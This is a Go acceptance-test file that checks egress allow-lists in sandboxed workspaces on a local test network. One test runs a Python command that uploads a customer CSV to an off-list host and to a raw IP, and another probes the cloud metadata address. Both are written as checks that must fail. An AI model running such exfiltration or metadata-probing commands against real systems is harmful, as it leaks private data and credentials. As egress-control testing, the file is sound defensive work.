package acceptance

import (
	"github.com/AQLD/cairn/client"
)

// Journey steps that rest on outbound allow-lists (G5.4), against the same
// small internet: allowed.test stands for what the task may reach (a package
// index, a research source, an internal API), other.test and the second
// address for everything else.

func init() {
	register("G12.4", func(e *Env) {
		world := newEgressNet(e)
		ws := egressWorkspace(e, "analysis", "allowed.test")
		e.Write(ws.ID, "data/customers.csv", "id,email\n1,a@example.com\n")
		if out, ok := fetch(e, ws.ID, "http://allowed.test:8080/"); !ok {
			e.T.Fatalf("the allowed package index is unreachable: %s", out)
		}
		send := func(target string) bool {
			res, err := e.C.Exec(e.Ctx, ws.ID, client.Exec{Command: []string{"python3", "-c",
				"import urllib.request\nurllib.request.urlopen(urllib.request.Request('" + target + "', data=open('data/customers.csv','rb').read()), timeout=4)"},
				TimeoutMS: 20_000})
			e.Must(err)
			return res.ExitCode == 0
		}
		if send("http://other.test:8080/upload") {
			e.T.Fatal("data was sent to a name off the list")
		}
		if send("http://" + world.otherIP + ":8080/upload") {
			e.T.Fatal("data was sent straight to an address")
		}
		off, err := e.C.CreateWorkspace(e.Ctx, client.CreateWorkspace{Name: "offline"})
		e.Must(err)
		if _, ok := fetch(e, off.ID, "http://"+world.allowedIP+":8080/"); ok {
			e.T.Fatal("a workspace with the network off reached a server")
		}
	})

	register("G14.2", func(e *Env) {
		newEgressNet(e)
		ws := egressWorkspace(e, "research", "allowed.test", "*.ok.test")
		for _, src := range []string{"http://allowed.test:8080/", "http://x.ok.test:8080/"} {
			if out, ok := fetch(e, ws.ID, src); !ok {
				e.T.Fatalf("allowed source %s: %s", src, out)
			}
		}
		if _, ok := fetch(e, ws.ID, "http://other.test:8080/"); ok {
			e.T.Fatal("fetched from a source off the list")
		}
	})

	register("G15.2", func(e *Env) {
		world := newEgressNet(e)
		ws := egressWorkspace(e, "workflow", world.allowedIP+"/32")
		if out, ok := fetch(e, ws.ID, "http://"+world.allowedIP+":8080/"); !ok {
			e.T.Fatalf("the allowed internal host is unreachable: %s", out)
		}
		if _, ok := fetch(e, ws.ID, "http://"+world.otherIP+":8080/"); ok {
			e.T.Fatal("reached an internal host off the list")
		}
		if _, ok := fetch(e, ws.ID, "http://169.254.169.254/latest/meta-data/"); ok {
			e.T.Fatal("reached cloud metadata")
		}
	})
}
